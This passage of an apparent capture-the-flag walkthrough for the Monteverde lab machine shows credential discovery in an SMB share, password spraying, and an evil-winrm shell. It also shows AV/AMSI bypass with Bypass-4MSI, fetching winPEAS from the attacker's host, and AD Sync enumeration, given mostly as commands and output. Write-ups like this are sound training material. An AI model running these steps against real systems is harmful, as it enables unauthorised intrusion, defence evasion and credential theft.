  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
```

`netexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares -M spider_plus`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ            
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.172.json". 🔍
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] SMB Shares:           8 (ADMIN$, azure_uploads, C$, E$, IPC$, NETLOGON, SYSVOL, users$)
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] SMB Readable Shares:  5 (azure_uploads, IPC$, NETLOGON, SYSVOL, users$)
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] Total folders found:  23
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] Total files found:    6
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] File size average:    1.58 KB
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] File size min:        22 B
SPIDER_PLUS 10.10.10.172    445    MONTEVERDE       [*] File size max:        4.43 KB
```

`cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.172.json`:
```json
{
    "NETLOGON": {},
    "SYSVOL": {
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-03 13:47:23",
            "ctime_epoch": "2020-01-02 23:05:22",
            "mtime_epoch": "2020-01-03 13:47:23",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-03 13:47:23",
            "ctime_epoch": "2020-01-02 23:05:22",
            "mtime_epoch": "2020-01-03 13:47:23",
            "size": "1.07 KB"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2020-01-02 23:17:56",
            "ctime_epoch": "2020-01-02 23:17:56",
            "mtime_epoch": "2020-01-02 23:17:56",
            "size": "2.73 KB"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-02 23:26:34",
            "ctime_epoch": "2020-01-02 23:05:22",
            "mtime_epoch": "2020-01-02 23:26:34",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-02 23:26:34",
            "ctime_epoch": "2020-01-02 23:05:22",
            "mtime_epoch": "2020-01-02 23:26:34",
            "size": "4.43 KB"
        }
    },
    "azure_uploads": {},
    "users$": { 📌
        "mhope/azure.xml": { 🔍
            "atime_epoch": "2020-01-03 14:41:18",
            "ctime_epoch": "2020-01-03 14:39:53",
            "mtime_epoch": "2020-01-03 15:59:24",
            "size": "1.18 KB"
        }
    }
}
```

`mkdir ./users_smbshare`

`smbclient -U 'SABatchJobs' --password='SABatchJobs' '//10.10.10.172/users$' -c 'prompt OFF;lcd /home/kali/users_smbshare;get .\mhope\azure.xml'`:
```
getting file \mhope\azure.xml of size 1212 as .\mhope\azure.xml (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
```

`cat ./users_smbshare/azure.xml`:
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S> 📌
    </Props>
  </Obj>
</Objs>
```

`netexec smb 10.10.10.172 -u ./domain_users.txt -p '4n0therD4y@n0th3r$'`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 🔑
```

`netexec smb 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$' --shares`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ     
```

`netexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'`:
```
WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!) 📌
```

`evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'`:
```                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

![Victim: mhope](https://custom-icon-badges.demolab.com/badge/Victim-mhope-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
megabank\mhope
```

`dir C://Users/mhope/Desktop`:
```
    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/8/2024   3:35 AM             34 user.txt
```

`type C://Users/mhope/Desktop/user.txt`:
```
a47d4*************************** 🚩
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group 📌
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group 🔍
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`dir C://Users`:
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:53 PM                AAD_987d7f2f57d2 🔍
d-----         1/2/2020   9:35 PM                Administrator
d-----         1/3/2020   5:31 AM                mhope
d-r---         1/2/2020   9:35 PM                Public
```

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            dgalanos
Guest                    krbtgt                   mhope
roleary                  SABatchJobs              smorgan
svc-ata                  svc-bexec                svc-netapp
The command completed with one or more errors.
```

`net user mhope`:
```
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   11/8/2024 7:35:52 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use 📌
Global Group memberships     *Azure Admins 🔍       *Domain Users
The command completed successfully.
```

`net group`:
```
Group Accounts for \\

-------------------------------------------------------------------------------
*Azure Admins 🔍
*Call Recording Admins
*Cloneable Domain Controllers
*Developers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*File Server Admins
*Group Policy Creator Owners
*HelpDesk
*Key Admins
*Operations
*Protected Users
*Read-only Domain Controllers
*Reception
*Schema Admins
*Trading
The command completed with one or more errors.
```

`net localgroup`:
```
Aliases for \\MONTEVERDE

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*ADSyncAdmins 🔍
*ADSyncBrowse
*ADSyncOperators
*ADSyncPasswordSet
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*SQLServer2005SQLBrowserUser$MONTEVERDE
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

`net group "Azure Admins"`:
```
Group name     Azure Admins
Comment

Members

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            mhope
The command completed successfully.
```

`net localgroup "ADSyncAdmins"`:
```
Alias name     ADSyncAdmins
Comment        ADSyncAdmins

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'seatbelt.exe'`:
```
/home/kali/tools/Ghostpack-CompiledBinaries/Seatbelt.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v3.5 compiled binaries/Seatbelt.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v4.5 compiled binaries/Seatbelt.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v4.7.2 compiled binaries/Seatbelt.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v4.8.1 compiled binaries/Seatbelt.exe
```

`cp ~/tools/Ghostpack-CompiledBinaries/Seatbelt.exe ./seatbelt.exe`

`upload ./seatbelt.exe`:
```
Info: Uploading /home/kali/seatbelt.exe to C:\Users\mhope\Desktop\seatbelt.exe
                                        
Data: 795988 bytes of 795988 bytes copied
                                        
Info: Upload successful!
```

![Victim: mhope](https://custom-icon-badges.demolab.com/badge/Victim-mhope-64b5f6?logo=windows11&logoColor=white)

`./seatbelt.exe`:
```
Program 'seatbelt.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ ./seatbelt.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ ./seatbelt.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```
❌

`dir`:
```
```
❌

`menu`:
```
   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

`Bypass-4MSI`:
```
Info: Patching ETW, please be patient ..
                                        
[+] Success!
```

`upload ./seatbelt.exe`:
```
Info: Uploading /home/kali/seatbelt.exe to C:\Users\mhope\Documents\seatbelt.exe
                                        
Data: 821248 bytes of 821248 bytes copied
                                        
Info: Upload successful!
```

`./seatbelt.exe`:
```
Program 'seatbelt.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ ./seatbelt.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ ./seatbelt.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```
❌

`dir`:
```
```
❌

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'winpeas.exe'`:
```
/home/kali/tools/SharpCollection/NetFramework_4.0_x64/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_x86/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_Any/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x64/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x86/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_Any/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x64/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x86/winPEAS.exe
```

`cp /home/kali/tools/SharpCollection/NetFramework_4.7_Any/winPEAS.exe ./winpeas.exe`

`python3 -m http.server -d ./www`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![Victim: mhope](https://custom-icon-badges.demolab.com/badge/Victim-mhope-64b5f6?logo=windows11&logoColor=white)

`curl http://10.10.14.22/winpeas.exe -o ./winpeas.exe`:
```
    Directory: C:\Users\mhope\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/9/2024   5:07 AM        9698304 winpeas.exe
```

`./winpeas.exe > ./winpeas_output.txt`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download ./winpeas_output.txt`:
```
Info: Downloading C:\Users\mhope\Documents\winpeas_output.txt to winpeas_output.txt
                                        
Info: Download successful!
```

`file ./winpeas_output.txt`:
```
winpeas_output.txt: Unicode text, UTF-16, little-endian text, with very long lines (494), with CRLF line terminators, with escape sequences
```

`iconv -f UTF-16 -t UTF-8 ./winpeas_output.txt -o ./winpeas_output_utf8.txt`

`file ./winpeas_output_utf8.txt`:
```
winpeas_output_utf8.txt: Unicode text, UTF-8 text, with very long lines (494), with CRLF line terminators, with escape sequences    
```

`cat ./winpeas_output_utf8.txt`:
```
[...]

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Microsoft Analysis Services
    C:\Program Files\Microsoft Azure Active Directory Connect
    C:\Program Files\Microsoft Azure Active Directory Connect Upgrader
    C:\Program Files\Microsoft Azure AD Connect Health Sync Agent
    C:\Program Files\Microsoft Azure AD Sync 🔍
    C:\Program Files\Microsoft SQL Server 🔍
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft.NET
    C:\Program Files\PackageManagement
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell

[...]

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

[...]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                                                             
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               88            0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         888             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         888             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         3596            sqlservr 📌
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2684            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         468             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1180            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1696            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49673         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49674         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49676         0.0.0.0               0               Listening         2524            spoolsv
  TCP        0.0.0.0               49679         0.0.0.0               0               Listening         608             services
  TCP        0.0.0.0               49696         0.0.0.0               0               Listening         2616            dns
  TCP        0.0.0.0               49748         0.0.0.0               0               Listening         2824            dfsrs
  TCP        10.10.10.172          53            0.0.0.0               0               Listening         2616            dns
  TCP        10.10.10.172          135           10.10.10.172          55408           Established       888             svchost
  TCP        10.10.10.172          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.10.172          445           10.10.14.49           53210           Established       4               System
  TCP        10.10.10.172          1433          10.10.10.172          49709           Established       3596            sqlservr 🔍

[...]
```

We can see that both `Microsoft SQL Server` and `AD Sync` are installed. There are many articles published online regarding vulnerabilities and privilege escalation opportunities with the Azure AD (AAD) Sync service.

![Victim: mhope](https://custom-icon-badges.demolab.com/badge/Victim-mhope-64b5f6?logo=windows11&logoColor=white)

`dir C:\\Progra~1`:
```
    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync 🔍
d-----         1/2/2020   2:38 PM                Microsoft SQL Server 🔍
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

Let's find out the version of `AD Sync`. According to the Microsoft [documentation](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account), the name of the service responsible for syncing the local AD to Azure AD is `ADSync`.

`Get-Process`:
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    120       7     6444      10552              1548   0 conhost
    514      18     2264       5368               392   0 csrss
    162       9     1700       4728               476   1 csrss
    390      32    16936      23520              2824   0 dfsrs
    153       8     2064       6076              3284   0 dfssvc
    252      14     4012      13460              3844   0 dllhost
  10373    9603   131092     128780              2616   0 dns
    540      22    14700      36192               996   1 dwm
     49       6     1500       3956              1752   0 fontdrvhost
     49       6     1632       4232              2000   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    133      12     2000       5652              2828   0 ismserv
    470      25    10644      42320              5020   1 LogonUI
   1899     185    50852      65352               628   0 lsass
    435      30    38568      47944              2684   0 Microsoft.ActiveDirectory.WebServices
    521      28    39000      48888              2752   0 Microsoft.Identity.AadConnect.Health.AadSync.Host
    432      25    43816      48212              1508   0 Microsoft.Identity.Health.AadSync.MonitoringAgent.Startup
    238      13    17812      17156              1072   0 Microsoft.Online.Reporting.MonitoringAgent.Launcher
    906      71   396052     340912              3152   0 miiserver

[...]
```

`tasklist.exe`:
```
tasklist.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```
❌

`Get-Service`:
```
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:1 char:1
+ Get-Service
+ ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
```
❌

`wmic.exe service get name`:
```
WMIC.exe : ERROR:
    + CategoryInfo          : NotSpecified: (ERROR::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

Description = Access denied
```
❌

`sc.exe query state= all`:
```
[SC] OpenSCManager FAILED 5:

Access is denied.
```
❌

`net.exe start`:
```
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

Access is denied.
```
❌

`Get-WMIObject -Class win32_product`:
```
Access denied 
At line:1 char:1
+ Get-WMIObject -Class win32_product
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
```
❌

We don't see a reference to this on running `Get-Process`, and attempting to run `tasklist.exe` results in an `Access Denied` error.
We can also try to enumerate services with the PowerShell cmdlet `Get-Service`, or by invoking `wmic.exe service get name`, `sc.exe query state= all`, `net.exe start`, or `Get-WMIObject -Class win32_product`, but are also denied access.
Instead, we can enumerate the service instance using the Registry.

`Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync`:
```
    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services


Name                           Property
----                           --------
ADSync                         Type             : 16
                               Start            : 2
                               ErrorControl     : 1
                               ImagePath        : "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" 📌
                               DisplayName      : Microsoft Azure AD Sync
                               DependOnService  : {winmgmt}
                               ObjectName       : MEGABANK\AAD_987d7f2f57d2
                               Description      : Enables integration and management of identity information across multiple directories, systems and platforms. If this service is stopped or disabled, no synchronization or password management for
                               objects in connected data
                                                  sources will be performed.
                               FailureActions   : {0, 0, 0, 0...}
                               DelayedAutostart : 1
```

This reveals that the service binary is `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`.
We can issue the command below to obtain the file (and product) version.

`Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force`:
```
PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Microsoft Azure AD Sync\Bin
PSChildName       : miiserver.exe
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
Mode              : -a----
VersionInfo       : File:             C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe
                    InternalName:     miiserver
                    OriginalFilename: miiserver.exe 📌
                    FileVersion:      1.1.882.0 📌
                    FileDescription:  AD-IAM-HybridSync master (0eb4240d4) Azure AD Connect synchronization service.
                    Product:          MicrosoftÂ® AzureÂ® AD Connect 📌
